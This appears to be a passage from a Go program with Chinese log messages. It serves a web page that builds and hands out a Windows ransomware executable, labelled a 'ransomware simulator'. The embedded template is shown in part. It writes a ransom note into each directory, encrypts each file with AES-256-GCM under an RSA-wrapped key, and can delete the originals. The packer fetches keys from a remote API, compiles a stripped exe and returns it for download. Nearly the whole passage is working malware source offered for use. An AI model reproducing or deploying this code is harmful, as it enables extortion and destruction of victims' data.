	pubKey, parseErr := getPublicKey(publicKeyPEM)
	if parseErr != nil {
		fmt.Printf("失败: %v\\n", parseErr)
		fmt.Println("[!] 公钥格式错误，程序终止")
		os.Exit(1)
	}
	publicKeyCache = pubKey
	publicKeyCacheStr = publicKeyPEM
	fmt.Println("成功")

	jobs := make(chan string, len(files))
	var wg sync.WaitGroup

	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid, uuid, uuid)
	var visitedDirs sync.Map

	log, err3 := newFileLog("ransom_log.txt")
	if err3 != nil {
		fmt.Printf("无法创建日志文件: %v\\n", err3)
	}
	if log != nil {
		defer func() { _ = log.Close() }()
	}

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for file := range jobs {
				dirPath := filepath.Dir(file)
				if _, loaded := visitedDirs.LoadOrStore(dirPath, true); !loaded {
					notePath := filepath.Join(dirPath, ransomNoteFileName)
					_ = os.WriteFile(notePath, []byte(finalAccurateNote), 0644)
				}
				if err := processFile(file, publicKeyPEM, removeOriginal); err != nil {
					stats.failed.Add(1)
					logFailed(file, err.Error())
					if log != nil { log.Log(fmt.Sprintf("FAILED: %s - %v", file, err)) }
				} else {
					stats.success.Add(1)
					logSuccess(file)
				}
			}
		}()
	}

	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	done := make(chan bool)
	go func() {
		totalFiles := uint64(len(files))
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				processed := stats.success.Load() + stats.failed.Load()
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					fmt.Printf("\\r[*] 进度: %.1f%% (%d/%d)", progress, processed, totalFiles)
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	fmt.Println()

	if logEnabled { logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load())) }
}

func processFile(filePath, publicKeyPEM string, removeOriginal bool) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("读取文件失败: %w", err)
	}

	if len(data) == 0 {
		return fmt.Errorf("文件为空，跳过: %s", filePath)
	}

	if logEnabled { logOperation(fmt.Sprintf("正在加密文件: %s", filePath)) }

	encryptedData, err := encryptData(data, publicKeyPEM)
	if err != nil {
		return fmt.Errorf("加密失败: %w", err)
	}

	outputPath := filePath + ".encrypted"
	if err := os.WriteFile(outputPath, encryptedData, 0644); err != nil {
		return fmt.Errorf("写入加密文件失败: %w", err)
	}

	if removeOriginal {
		if err := os.Remove(filePath); err != nil {
			return fmt.Errorf("删除原文件失败: %w", err)
		}
	}

	return nil
}

func encryptData(data []byte, publicKeyPEM string) ([]byte, error) {
	pubKey, err := getPublicKey(publicKeyPEM)
	if err != nil {
		return nil, err
	}

	aesKey := make([]byte, 32) // AES-256
	if _, err := rand.Read(aesKey); err != nil {
		return nil, fmt.Errorf("生成AES密钥失败: %w", err)
	}

	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, aesKey, nil)
	if err != nil {
		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("创建AES密码器失败: %w", err)
	}

	// Use GCM for authenticated encryption
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建GCM失败: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("生成Nonce失败: %w", err)
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	// Format: [4-byte key length][encrypted AES key][ciphertext]
	keyLen := len(encryptedAESKey)
	header := make([]byte, 4)
	header[0] = byte(keyLen >> 24)
	header[1] = byte(keyLen >> 16)
	header[2] = byte(keyLen >> 8)
	header[3] = byte(keyLen)

	result := make([]byte, 0, 4+keyLen+len(ciphertext))
	result = append(result, header...)
	result = append(result, encryptedAESKey...)
	result = append(result, ciphertext...)

	return result, nil
}

func newFileLog(filename string) (*fileLog, error) {
	f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return nil, err
	}
	return &fileLog{file: f}, nil
}

func (fl *fileLog) Log(msg string) {
	fl.mu.Lock()
	defer fl.mu.Unlock()
	_, _ = fl.file.WriteString(fmt.Sprintf("[%s] %s\\n", time.Now().Format("2006-01-02 15:04:05"), msg))
}

func (fl *fileLog) Close() error {
	fl.mu.Lock()
	defer fl.mu.Unlock()
	return fl.file.Close()
}

func getKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}
`

// ===========================================================================
// End of Embedded Source Template
// ===========================================================================

// APIKeyResponse represents the response from the remote key generation API
type APIKeyResponse struct {
	Status        string `json:"status"`
	UUID          string `json:"uuid"`
	PublicKeyPEM  string `json:"public_key_pem"`
	PrivateKeyPEM string `json:"private_key_pem"`
	Message       string `json:"message"`
}

// PackRequest is the JSON body for /api/pack
type PackRequest struct {
	UUID         string `json:"uuid"`
	PublicKeyPEM string `json:"public_key_pem"`
}

// PackErrorResponse is returned on errors
type PackErrorResponse struct {
	Error string `json:"error"`
}

func main() {
	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/api/fetch-keys", fetchKeysHandler)
	http.HandleFunc("/api/pack", packHandler)

	log.Printf("🔐 勒索软件模拟器打包服务启动，监听端口 %s", listenAddr)
	log.Printf("   访问 http://localhost%s 开始打包", listenAddr)
	log.Fatal(http.ListenAndServe(listenAddr, nil))
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(htmlTemplate))
}

func fetchKeysHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, `{"error":"仅支持POST方法"}`, http.StatusMethodNotAllowed)
		return
	}

	log.Println("[fetch-keys] 正在从远程API获取密钥对...")

	jsonBody := []byte("{}")
	req, err := http.NewRequest("POST", remoteAPIURL, bytes.NewBuffer(jsonBody))
	if err != nil {
		log.Printf("[fetch-keys] 创建请求失败: %v", err)
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "创建请求失败: " + err.Error()})
		return
	}
	req.Header.Set("User-Agent", "RansomSimulator-Packer/1.0")
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[fetch-keys] API请求失败: %v", err)
		writeJSON(w, http.StatusBadGateway, PackErrorResponse{Error: "远程API不可达: " + err.Error()})
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("[fetch-keys] 读取响应失败: %v", err)
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "读取远程API响应失败: " + err.Error()})
		return
	}

	var keyResp APIKeyResponse
	if err := json.Unmarshal(body, &keyResp); err != nil {
		log.Printf("[fetch-keys] 解析响应JSON失败: %v", err)
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "解析远程API响应失败: " + err.Error()})
		return
	}

	if keyResp.Status != "success" {
		log.Printf("[fetch-keys] 远程API返回错误: %s - %s", keyResp.Status, keyResp.Message)
		writeJSON(w, http.StatusBadGateway, PackErrorResponse{Error: "远程API返回错误: " + keyResp.Message})
		return
	}

	log.Printf("[fetch-keys] 成功获取密钥，UUID: %s", keyResp.UUID)

	// Return keys to frontend (excluding private key for security in production,
	// but included here as it's needed for decryption reference)
	writeJSON(w, http.StatusOK, map[string]string{
		"status":         "success",
		"uuid":           keyResp.UUID,
		"public_key_pem": keyResp.PublicKeyPEM,
	})
}

func packHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, PackErrorResponse{Error: "仅支持POST方法"})
		return
	}

	var req PackRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, PackErrorResponse{Error: "请求体格式错误: " + err.Error()})
		return
	}

	if req.UUID == "" || req.PublicKeyPEM == "" {
		writeJSON(w, http.StatusBadRequest, PackErrorResponse{Error: "缺少 uuid 或 public_key_pem 参数"})
		return
	}

	log.Printf("[pack] 开始打包，UUID: %s", req.UUID)

	// Create temporary build directory
	shortID := strings.Replace(req.UUID[:8], "-", "", -1)
	buildDir := filepath.Join(os.TempDir(), "ransom_pack_"+shortID)
	if err := os.MkdirAll(buildDir, 0755); err != nil {
		log.Printf("[pack] 创建构建目录失败: %v", err)
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "创建临时目录失败: " + err.Error()})
		return
	}

	// Clean up build directory after completion
	defer func() {
		if err := os.RemoveAll(buildDir); err != nil {
			log.Printf("[pack] 清理临时目录失败: %v", err)
		}
	}()

	// Render the source template
	tmpl, err := template.New("source").Delims("{{", "}}").Parse(embeddedSourceTemplate)
	if err != nil {
		log.Printf("[pack] 解析模板失败: %v", err)
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "解析源码模板失败: " + err.Error()})
		return
	}

	var sourceBuf bytes.Buffer
	err = tmpl.Execute(&sourceBuf, map[string]string{
		"UUID":         req.UUID,
		"PublicKeyPEM": req.PublicKeyPEM,
		"BT":           "`",
	})
	if err != nil {
		log.Printf("[pack] 渲染模板失败: %v", err)
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "渲染源码模板失败: " + err.Error()})
		return
	}

	// Write the rendered source to main.go
	mainGoPath := filepath.Join(buildDir, "main.go")
	if err := os.WriteFile(mainGoPath, sourceBuf.Bytes(), 0644); err != nil {
		log.Printf("[pack] 写入main.go失败: %v", err)
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "写入源码文件失败: " + err.Error()})
		return
	}

	// Initialize go module in build directory
	modInit := exec.Command("go", "mod", "init", "ransom_simulator")
	modInit.Dir = buildDir
	if out, err := modInit.CombinedOutput(); err != nil {
		log.Printf("[pack] go mod init失败: %v, 输出: %s", err, string(out))
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "初始化Go模块失败: " + string(out)})
		return
	}

	// Get dependencies
	modTidy := exec.Command("go", "mod", "tidy")
	modTidy.Dir = buildDir
	if out, err := modTidy.CombinedOutput(); err != nil {
		log.Printf("[pack] go mod tidy失败: %v, 输出: %s", err, string(out))
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "下载依赖失败: " + string(out)})
		return
	}

	// Compile for Windows
	exeName := "ransom_simulator_" + shortID + ".exe"
	exePath := filepath.Join(buildDir, exeName)

	buildCmd := exec.Command("go", "build", "-ldflags", "-s -w", "-o", exeName, "main.go")
	buildCmd.Dir = buildDir
	buildCmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
	)

	if out, err := buildCmd.CombinedOutput(); err != nil {
		log.Printf("[pack] 编译失败: %v, 输出: %s", err, string(out))
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "编译失败: " + string(out)})
		return
	}

	log.Printf("[pack] 编译成功: %s", exePath)

	// Return the exe as download
	w.Header().Set("Content-Type", "application/vnd.microsoft.portable-executable")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, exeName))

	exeData, err := os.ReadFile(exePath)
	if err != nil {
		log.Printf("[pack] 读取exe文件失败: %v", err)
		writeJSON(w, http.StatusInternalServerError, PackErrorResponse{Error: "读取编译产物失败: " + err.Error()})
		return
	}

	w.Write(exeData)
	log.Printf("[pack] 下载完成: %s (%.2f KB)", exeName, float64(len(exeData))/1024)
}

func writeJSON(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}
